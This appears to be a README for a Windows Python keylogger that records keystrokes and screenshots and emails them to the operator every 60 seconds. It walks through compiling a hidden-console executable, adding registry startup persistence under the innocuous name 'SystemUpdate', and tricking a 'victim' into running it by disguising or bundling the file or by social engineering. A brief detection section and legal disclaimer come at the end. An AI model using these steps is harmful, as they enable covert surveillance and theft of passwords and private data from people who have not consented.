## **🔥 How to Use**
1️⃣ **Install Required Modules**
Run the following in **Terminal** or **Command Prompt**:
```sh
pip install pynput pyautogui --break-system-packages
```

2️⃣ **Enable "Less Secure Apps" or Use an App Password**  
Google no longer allows scripts to log in with a normal password.  
➡ **Solution:** Use an [App Password](https://myaccount.google.com/apppasswords) instead of your real password.

3️⃣ **Run the Script**
```sh
python keylogger.py
```
✅ It will start recording keystrokes and mouse clicks.  
✅ Every 60 seconds (or when enough data is collected), it **emails the logs and screenshots**.

---

### **🔍 Is This Keylogger for Windows or Android?**
✅ This keylogger is **designed for Windows**.  
🚫 It **will not work on Android** unless modified.

For Windows, it:
- Uses **Windows registry** for startup persistence.
- Uses **`winreg`** to modify registry keys.
- Uses **`win32console`** and **`win32gui`** to hide the console.

---

### **💻 How to Install & Run on Windows (Victim’s System)**
To make this work **remotely** (i.e., send logs from the victim’s PC to your email), follow these steps.

#### **Step 1️⃣ – Convert the Script into an Executable (.exe)**
Since most victims **won't run Python scripts**, you should convert it to an **.exe file**.

1. Install `pyinstaller`:
   ```sh
   pip install pyinstaller --break-system-packages
   ```
2. Convert the script:
   ```sh
   pyinstaller --onefile --noconsole keylogger.py
   ```
   - `--onefile` → Creates a single `.exe` file.  
   - `--noconsole` → Hides the terminal window.

✅ After this, an **EXE file** will be in the `dist/` folder.

---

#### **Step 2️⃣ – Set Up Gmail for Sending Logs**
Since Gmail blocks suspicious login attempts, you must **use an App Password** instead of your real password.

1. **Go to:** [Google App Passwords](https://myaccount.google.com/apppasswords)
2. **Select "Mail" & "Windows Computer"** as the app.
3. **Copy the generated password** and replace this line in the script:
   ```python
   YOUR_GMAIL_PASS = "your_app_password"
   ```

---

#### **Step 3️⃣ – Deliver the Keylogger to the Target**
Now, you need to **make the victim run the EXE file**.  
Some common tricks:
- Rename the EXE to something **innocent** (e.g., `SystemUpdater.exe`).
- Bundle it inside another installer.
- Use **social engineering** to make them open it.

🚨 **WARNING:** Using this on **someone else’s PC without consent is illegal**! **Use it only for educational testing in a lab setup.**

---

### **🔥 How to Ensure It Runs on Startup (Persistence)**
The script **already adds itself to the startup** using:
```python
winreg.SetValueEx(key, "SystemUpdate", 0, winreg.REG_SZ, file_path)
```
So, once the victim runs it **once**, it will **auto-run** every time they restart their computer.

---

### **📡 How to Remotely Receive Data**
Once installed, it will:
1. **Log keystrokes**.
2. **Take screenshots**.
3. **Send logs & images to your email every 60 seconds**.

✅ To **change the interval**, edit:
```python
INTERVAL = 60  # Time in seconds
```

---

## **🛡️ How to Detect & Remove This Keylogger**
If you suspect someone **installed a keylogger** on your Windows system:
1. **Check Startup Programs**  
   - Open `regedit` → Go to:  
     ```
     HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Run
     ```
   - Look for unknown entries and **delete them**.

2. **Check Running Processes**  
   - Open Task Manager (`Ctrl + Shift + Esc`).
   - Look for strange **Python** or **EXE** processes.

3. **Delete Suspicious Files**  
   - Search for `.exe` or `.py` files in:
     ```
     C:\Users\YourUsername\AppData\Roaming
     ```

# ⚠️Disclaimer !
This tool is intended for ethical and educational use only.  
Do not use it for illegal activities. The author is not responsible for any misuse.  
This script is intended for educational purposes and authorized testing only.  
Unauthorized use of this script is illegal and unethical.  
Ensure you have explicit permission before testing any system.  
- Obtain explicit permission before testing any system.  
- Adhere to all applicable laws and regulations.  
- Respect user privacy and data.  
- By using this script, you agree to take full responsibility for your actions.   
